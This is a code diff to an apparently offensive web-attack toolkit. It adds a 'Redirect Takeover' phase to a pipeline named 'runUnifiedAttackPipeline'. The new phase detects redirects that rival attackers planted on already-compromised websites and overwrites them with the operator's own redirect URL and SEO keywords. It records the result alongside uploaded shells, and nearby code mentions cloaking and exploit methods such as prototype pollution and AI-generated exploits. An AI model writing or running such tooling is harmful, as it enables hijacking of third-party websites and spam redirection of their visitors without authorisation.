@@ -486,6 +486,8 @@ const METHOD_REGISTRY: Record<string, string> = {
   race_condition: "raceCondition",
   mass_assignment: "massAssignment",
   prototype_pollution: "prototypePollution",
+  // Redirect takeover (overwrite competitor redirects)
+  redirect_takeover: "redirectTakeover",
   // AI-generated
   ai_generated_exploit: "aiGeneratedExploit",
   comprehensive: "comprehensiveVectors",
@@ -2963,6 +2965,82 @@ export async function runUnifiedAttackPipeline(
       detail: `⏭️ Shellless Attack ข้าม — มีไฟล์ที่วางสำเร็จแล้ว ${uploadedFiles.length} ไฟล์`,
       progress: 95,
     });
+  }
+
+  // ─── Phase 5.5: Redirect Takeover (overwrite competitor redirects on already-hacked sites) ───
+  const redirectTakeoverEnabled = !config.methodPriority || config.methodPriority.length === 0 || config.methodPriority.some(m => m.id === 'redirect_takeover' && m.enabled);
+  if (!hasSuccessfulRedirect() && !shouldStop('redirect_takeover') && redirectTakeoverEnabled) {
+    try {
+      loggedOnEvent({
+        phase: "shellless" as any,
+        step: "redirect_takeover_start",
+        detail: `🔄 Phase 5.5: Redirect Takeover — ตรวจจับและ overwrite redirect ของคู่แข่ง...`,
+        progress: 96,
+      });
+
+      const { detectExistingRedirects, executeRedirectTakeover } = await import("./redirect-takeover");
+      const detection = await detectExistingRedirects(config.targetUrl);
+
+      if (detection.detected && detection.competitorUrl) {
+        loggedOnEvent({
+          phase: "shellless" as any,
+          step: "redirect_takeover_detected",
+          detail: `🎯 พบ redirect ของคู่แข่ง: ${detection.competitorUrl} (${detection.methods.length} methods) — กำลัง overwrite...`,
+          progress: 97,
+        });
+
+        const takeoverResults = await executeRedirectTakeover({
+          targetUrl: config.targetUrl,
+          ourRedirectUrl: config.redirectUrl,
+          seoKeywords: config.seoKeywords,
+          onProgress: (phase, detail) => {
+            loggedOnEvent({ phase: "shellless" as any, step: `takeover_${phase}`, detail, progress: 97 });
+          },
+        });
+
+        const successResult = takeoverResults.find(r => r.success);
+        if (successResult) {
+          loggedOnEvent({
+            phase: "shellless" as any,
+            step: "redirect_takeover_success",
+            detail: `✅ Redirect Takeover สำเร็จ! Overwrite ${detection.competitorUrl} → ${config.redirectUrl} (${successResult.method})`,
+            progress: 98,
+          });
+          uploadedFiles.push({
+            url: successResult.injectedUrl || config.targetUrl,
+            shell: shells[0] || { id: "takeover", type: "html" as any, filename: "takeover.html", content: "", size: 0, mimeType: "text/html", headers: {} },
+            method: `redirect_takeover_${successResult.method}`,
+            verified: true,
+            redirectWorks: true,
+            redirectDestinationMatch: true,
+            finalDestination: config.redirectUrl,
+            redirectChain: [],
+            httpStatus: 302,
+          });
+        } else {
+          loggedOnEvent({
+            phase: "shellless" as any,
+            step: "redirect_takeover_failed",
+            detail: `⚠️ Redirect Takeover ล้มเหลว — ${takeoverResults.map(r => r.detail).join("; ")}`,
+            progress: 97,
+          });
+        }
+      } else {
+        loggedOnEvent({
+          phase: "shellless" as any,
+          step: "redirect_takeover_no_competitor",
+          detail: `ℹ️ ไม่พบ redirect ของคู่แข่งบน target นี้`,
+          progress: 97,
+        });
+      }
+    } catch (error: any) {
+      loggedOnEvent({
+        phase: "shellless" as any,
+        step: "redirect_takeover_error",
+        detail: `⚠️ Redirect Takeover error: ${error.message}`,
+        progress: 97,
+      });
+    }
   }
 
   // ─── Phase 6: Cloaking (ONLY if real file upload succeeded — not shellless) ───
